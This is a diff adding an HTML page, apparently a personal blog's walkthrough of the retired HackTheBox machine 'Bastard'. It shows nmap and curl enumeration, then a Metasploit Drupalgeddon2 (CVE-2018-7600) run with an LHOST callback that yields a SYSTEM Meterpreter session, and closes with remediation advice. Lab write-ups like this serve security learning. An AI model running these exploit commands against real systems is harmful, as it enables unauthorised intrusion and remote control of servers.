@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Bastard: Drupalgeddon2 straight to SYSTEM — Lucky Thandel</title>
+<meta name="description" content="Drupal 7 on IIS, one legendary 2018 RCE (CVE-2018-7600), and an app pool running as SYSTEM — patch your CMS. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-16 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Bastard: Drupalgeddon2 straight to SYSTEM</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Bastard is a retired HackTheBox easy Windows machine that is basically a one-CVE lesson. Synopsis: Drupal 7 on IIS, one legendary 2018 RCE (CVE-2018-7600, Drupalgeddon2), and an app pool running as SYSTEM.</p>
+<h2><span class="amber">$</span> Enumeration — name the CMS</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: scan plus CMS fingerprint</span>
+nmap -sC -sV -oN bastard.nmap 10.10.10.9
+curl -s http://10.10.10.9/ | grep -i drupal
+curl -s http://10.10.10.9/CHANGELOG.txt | head -5</pre>
+<p>Page source, headers, and CHANGELOG point at a Drupalgeddon2-vulnerable Drupal 7 build. CMS version first, exploit second.</p>
+<h2><span class="amber">$</span> Exploitation — Drupalgeddon2 (CVE-2018-7600)</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: drupal_drupalgeddon2</span>
+msfconsole -q
+msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2
+msf6 exploit(drupal_drupalgeddon2) &gt; set RHOSTS 10.10.10.9
+msf6 exploit(drupal_drupalgeddon2) &gt; set LHOST 10.10.14.23
+msf6 exploit(drupal_drupalgeddon2) &gt; run
+[*] Meterpreter session 1 opened as NT AUTHORITY\SYSTEM</pre>
+<p>Drupalgeddon2 abuses form-API input sanitization to execute PHP without authentication. No credentials, no user interaction — and the IIS app pool runs as SYSTEM, so both flags fall in the single session. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Enumerating SMB and FTP for an hour (the site tells you it is Drupal — follow the CMS lead) and hand-rolling the exploit before trying the module (run the known-good module to confirm, then study its requests to learn).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Patch Drupal on release day for critical SA-CORE advisories, run app pools as least-privilege identities, and WAF the known Drupalgeddon request shapes. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
